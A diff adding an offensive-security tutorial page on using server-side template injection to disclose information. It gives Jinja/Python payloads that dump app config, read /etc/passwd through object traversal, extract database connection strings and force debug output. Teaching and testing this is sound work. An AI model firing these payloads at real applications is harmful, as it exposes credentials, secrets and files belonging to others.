@@ -1,0 +1,124 @@
+---
+title: Leveraging SSTI for Information Disclosure
+description: Explore techniques to exploit SSTI vulnerabilities for accessing sensitive
+  information in web applications.
+keywords:
+- SSTI
+- information disclosure
+- web security
+- sensitive data
+- template injection
+- configuration exposure
+- environment variables
+- file system enumeration
+- source code disclosure
+- database connection strings
+---
+
+# Information Disclosure
+
+## Context
+
+Exploiting server-side template injection (SSTI) vulnerabilities is a powerful technique in offensive cybersecurity, often leading to significant information disclosure. This approach leverages flaws in web server applications to expose sensitive data. For effective exploitation, a working knowledge of template engines, web server configurations, and the HTTP request/response cycle is essential.
+
+## Theory
+
+### Information Disclosure via SSTI
+
+Information disclosure through SSTI refers to the unintended exposure of sensitive information when an attacker injects expressions into templates that the application processes. This exposure often occurs because templates are insufficiently sandboxed, allowing access to application internals such as configuration files, environment variables, or internal paths. The typical attack sequence involves crafting a malicious payload that, when rendered by the server, extracts and returns sensitive information to the attacker.
+
+### Sensitive Data Types Exposed by SSTI
+
+1. **Configuration Exposure**: Involves leaking application or server configuration details.
+2. **Environment Variable Disclosure**: Revealing secrets, keys, or credentials stored within environment variables.
+3. **File System Enumeration**: Listing or reading files and directories through crafted template expressions.
+4. **Source Code Disclosure**: Accessing application source files via template injection.
+5. **Database Connection String Leak**: Extracting database credentials from configuration settings or environment variables.
+6. **Template Debug Information**: Exposing stack traces or error messages that give insights into the template context or application logic.
+
+### Attacker Mindset and Threat Surface
+
+Attackers capitalizing on SSTI vulnerabilities are focused on enumerating accessible objects and functions to extract maximum sensitive data. The primary goal is to uncover secrets, credentials, and internal application structure, which can then be exploited further. This typically involves iterative probing—injecting benign expressions, analyzing responses, and incrementally escalating to sensitive data extraction.
+
+## Practice
+
+### Enumerate Environment Variables via SSTI
+
+- **Payload**: 
+
+    ```python
+    {{ config.items() }}
+    ```
+
+    This payload attempts to enumerate configuration or environment variables in Python-based templates.
+
+- **Payload**:
+
+    ```python
+    {{ getenv('SECRET_KEY') }}
+    ```
+
+    Directly accesses a specific environment variable if supported.
+
+**Outcome**: Successfully accessing these data points can yield environment variables or secrets exposed by the template context.
+
+### Read Sensitive Files via SSTI
+
+- **Payload**:
+
+    ```python
+    {{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
+    ```
+
+    This clever payload uses Python's object traversal to read sensitive files such as `/etc/passwd`. Note that the subclass index might need adjustment based on the application specifics.
+
+**Outcome**: Enables access to file contents, providing insights into system configurations or applications' sensitive data like passwords.
+
+### Enumerate Application Structure via SSTI
+
+- **Payload**:
+
+    ```python
+    {{ dir() }}
+    ```
+
+    Lists available objects in the template context.
+
+- **Payload**:
+
+    ```python
+    {{ request.application.__dict__ }}
+    ```
+
+    Attempts to enumerate application internals if they are accessible within the template context.
+
+**Outcome**: Reveals the internal application structure, aiding further exploitation and understanding of the application mechanics.
+
+### Extract Database Connection Strings via SSTI
+
+- **Payload**:
+
+    ```python
+    {{ config['SQLALCHEMY_DATABASE_URI'] }}
+    ```
+
+    Attempts to access database connection strings from the application's configuration.
+
+**Outcome**: Successful extraction provides access to database credentials, paving the way for lateral movement or data exfiltration.
+
+### Leak Template Debug Information
+
+- **Payload**:
+
+    ```python
+    {{ 7/0 }}
+    ```
+
+    This payload triggers a division-by-zero error, forcing the application to emit template error debug information, which often includes stack traces or insights into the template processing logic.
+
+**Outcome**: Such leaks can expose critical application logic, aiding attackers in understanding vulnerabilities or misconfigurations.
+
+## Tools
+
+- **Burp Suite**
+- **curl**
